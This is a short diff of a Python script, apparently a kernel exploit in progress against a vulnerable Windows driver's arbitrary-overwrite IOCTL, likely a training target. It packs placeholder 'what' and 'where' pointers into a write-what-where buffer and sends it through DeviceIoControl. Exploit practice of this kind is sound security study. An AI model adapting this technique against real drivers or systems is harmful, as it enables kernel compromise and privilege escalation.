@@ -17,19 +17,13 @@ def arbitrary_overwrite():
     else:
                 print "[X] Communicated with appropriate driver."
 
-                where_ptr = 42424242
-                what_ptr = 41414141 
+                where_ptr = 4242424242424242
+                what_ptr = 4141414141414141
                 whatwhere = struct.pack("<Q", what_ptr) + struct.pack("<Q", where_ptr)
                 input_size = len(whatwhere)
                 dwReturn = c_ulonglong() #all 64 bit so longlong...
                 IOCTL = "0x22200B"
-                kernel32.DeviceIoControl(driver_handle,
-                                         IOCTL,
-                                         whatwhere,
-                                         input_size,
-                                         None,
-                                         0,byref(dwReturn),
-                                         None)  
+                kernel32.DeviceIoControl(driver_handle,IOCTL,whatwhere,input_size,None,0,byref(dwReturn),None)  
 
 
 
